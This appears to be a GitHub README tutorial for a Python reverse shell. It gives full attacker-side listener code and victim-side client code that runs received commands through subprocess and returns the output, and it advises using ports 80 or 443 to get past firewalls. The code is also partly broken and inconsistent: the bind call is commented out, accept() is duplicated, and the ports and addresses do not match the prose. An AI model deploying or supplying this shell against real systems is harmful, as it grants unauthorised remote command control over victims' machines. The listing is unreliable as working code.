# python-reverseShell
A simple reverse shell writen purely in python


lntroduction

There are many ways to gain control over a compromised system. A common practice is to gain interactive shell access, which enables you to try to gain complete control of the operating system. However, most basic firewalls block direct remote connections. One of the methods to bypass this is to use reverse shells.

A reverse shell is a program that executes local cmd.exe (for Windows) or bash/zsh (for Unix-like) commands and sends the output to a remote machine. With a reverse shell, the target machine initiates the connection to the attacker machine, and the attacker's machine listens for incoming connections on a specified port; this will bypass firewalls.

The basic idea of the code we will implement is that the attacker's machine will keep listening for connections. Once a client (or target machine) connects, the server will send shell commands to the target machine and expect output results.

 

 
Server Side

First, let's start with the server (attacker's code):

import socket

SERVER_HOST = "0.0.0.0"
SERVER_PORT = 6400
BUFFER_SIZE = 1024 * 128 # 128KB max size of messages, feel free to increase
# separator string for sending 2 messages in one go
SEPARATOR = "<sep>"
# create a socket object
s = socket.socket()

 

Notice that I've used 0.0.0.0 as the server IP address, this means all IPv4 addresses on the local machine. You may wonder why we don't just use our local IP address or localhost or 127.0.0.1 ? Well, if the server has two IP addresses, let's say 192.168.1.101 on a network, and 10.0.1.1 on another, and the server listens on 0.0.0.0, then it will be reachable at both of those IPs.

We then specified some variables and initiated the TCP socket. Notice I used 5003 as the TCP port, feel free to choose any port above 1024; just make sure it's not used, and you should use it on both sides (i.e., server and client).

However, malicious reverse shells usually use the popular port 80 (i.e HTTP) or 443 (i.e HTTPS), this will allow it to bypass firewall restrictions of the target client, feel free to change it and try it out!

Now let's bind that socket we just created to our IP address and port:

# bind the socket to all IP addresses of this host s.bind((SERVER_HOST, SERVER_PORT))

 

Listening for connections:

s.listen(5)
print(f"Listening as {SERVER_HOST}:{SERVER_PORT} ...")

If any client attempts to connect to the server, we need to accept it:

# accept any connections attempted
client_socket, client_address = s.accept()
print(f"{client_address[0]}:{client_address[1]} Connected!")

accept() function waits for an incoming connection and returns a new socket representing the connection (client_socket), and the address (IP and port) of the client.

Now below code will be executed only if a user is connected to the server; let us receive a message from the client that contains the current working directory of the client:

# receiving the current working directory of the client
cwd = client_socket.recv(BUFFER_SIZE).decode()
print("[+] Current working directory:", cwd)

Note that we need to encode the message to bytes before sending, and we must send the message using the client_socket and not the server socket.

Now let's start our main loop, which is sending shell commands and retrieving the results, and printing them:

while True:
    # get the command from prompt
    command = input(f"{cwd} $> ")
    if not command.strip():
        # empty command
        continue
    # send the command to the client
    client_socket.send(command.encode())
    if command.lower() == "exit":
        # if the command is exit, just break out of the loop
        break
    # retrieve command results
    output = client_socket.recv(BUFFER_SIZE).decode()
    # split command output and current directory
    results, cwd = output.split(SEPARATOR)
    # print output
    print(results)

In the above code, we're prompting the server user (i.e., attacker) of the command he wants to execute on the client; we send that command to the client and expect the command's output to print it to the console.

Note that we're splitting the output into command results and the current working directory. That's because the client will be sending both of these messages in a single send operation.

If the command is "exit", just exit out of the loop and close the connections.

full server code

 import socket


SERVER_HOST = "127.0.0.1"
SERVER_PORT = 6400
BUFFER_SIZE = 1024 * 128 # 128KB max size of messages, feel free to increase
# separator string for sending 2 messages in one go
SEPARATOR = "<sep>"
# create a socket object
s = socket.socket()

 

# bind the socket to all IP addresses of this host s.bind((SERVER_HOST, SERVER_PORT))

s.listen(5)
print(f"Listening as {SERVER_HOST}:{SERVER_PORT} ...")

# accept any connections attempted
client_socket, client_address = s.accept()
print(f"{client_address[0]}:{client_address[1]} Connected!")


# accept any connections attempted
client_socket, client_address = s.accept()
print(f"{client_address[0]}:{client_address[1]} Connected!")

# receiving the current working directory of the client
cwd = client_socket.recv(BUFFER_SIZE).decode()
print("[+] Current working directory:", cwd)


while True:
    # get the command from prompt
    command = input(f"{cwd} $> ")
    if not command.strip():
        # empty command
        continue
    # send the command to the client
    client_socket.send(command.encode())
    if command.lower() == "exit":
        # if the command is exit, just break out of the loop
        break
    # retrieve command results
    output = client_socket.recv(BUFFER_SIZE).decode()
    # split command output and current directory
    results, cwd = output.split(SEPARATOR)
    # print output
    print(results)

 
Client Side

Let's see the code of the client now, open up a new file and write:

import socket
import os
import subprocess
import sys

SERVER_HOST = sys.argv[1]
SERVER_PORT = 6400
BUFFER_SIZE = 1024 * 128 # 128KB max size of messages, feel free to increase
# separator string for sending 2 messages in one go
SEPARATOR = "<sep>"

Above, we're setting the SERVER_HOST to be passed from the command line arguments, this is the IP or host of the server machine. If you're on a local network, then you should know the private IP of the server by using the command ipconfig on Windows and ifconfig on Linux.

Note that if you're testing both codes on the same machine, you can set the SERVER_HOST to 127.0.0.1 and it will work just fine.

Let's create the socket and connect to the server:

# create the socket object
s = socket.socket()
# connect to the server
s.connect((SERVER_HOST, SERVER_PORT))

Remember, the server expects the current working directory of the client just after connection. Let's send it then:

# get the current directory
cwd = os.getcwd()
s.send(cwd.encode())

We used the getcwd() function from os module, this function returns the current working directory. For instance, if you execute this code in the Desktop, it'll return the absolute path of the Desktop.

Going to the main loop, we first receive the command from the server, execute it and send the result back. Here is the code for that:

while True:
    # receive the command from the server
    command = s.recv(BUFFER_SIZE).decode()
    splited_command = command.split()
    if command.lower() == "exit":
        # if the command is exit, just break out of the loop
        break
    if splited_command[0].lower() == "cd":
        # cd command, change directory
        try:
            os.chdir(' '.join(splited_command[1:]))
        except FileNotFoundError as e:
            # if there is an error, set as the output
            output = str(e)
        else:
            # if operation is successful, empty message
            output = ""
    else:
        # execute the command and retrieve the results
        output = subprocess.getoutput(command)
    # get the current working directory as output
    cwd = os.getcwd()
    # send the results back to the server
    message = f"{output}{SEPARATOR}{cwd}"
    s.send(message.encode())
# close client connection
s.close()

First, we receive the command from the server using recv() method on the socket object, we then check if it's a cd command, if that's the case, then we use the os.chdir() function to change the directory, that's because subprocess.getoutput() spawns its own process and does not change the directory on the current Python process.

After that, if it's not a cd command, then we simply use subprocess.getoutput() function to get the output of the command executed.
Finally, we prepare our message that contains the command output and working directory and then send it

 

client side full code

import socket
import os
import subprocess
import sys

SERVER_HOST = sys.argv[1]
SERVER_PORT = 6400
BUFFER_SIZE = 1024 * 128 # 128KB max size of messages, feel free to increase
# separator string for sending 2 messages in one go
SEPARATOR = "<sep>"

# create the socket object
s = socket.socket()
# connect to the server
s.connect((SERVER_HOST, SERVER_PORT))

# get the current directory
cwd = os.getcwd()
s.send(cwd.encode())

while True:
    # receive the command from the server
    command = s.recv(BUFFER_SIZE).decode()
    splited_command = command.split()
    if command.lower() == "exit":
        # if the command is exit, just break out of the loop
        break
    if splited_command[0].lower() == "cd":
        # cd command, change directory
        try:
            os.chdir(' '.join(splited_command[1:]))
        except FileNotFoundError as e:
            # if there is an error, set as the output
            output = str(e)
        else:
            # if operation is successful, empty message
            output = ""
    else:
        # execute the command and retrieve the results
        output = subprocess.getoutput(command)
    # get the current working directory as output
    cwd = os.getcwd()
    # send the results back to the server
    message = f"{output}{SEPARATOR}{cwd}"
    s.send(message.encode())
# close client connection
s.close()

 

 

 

 
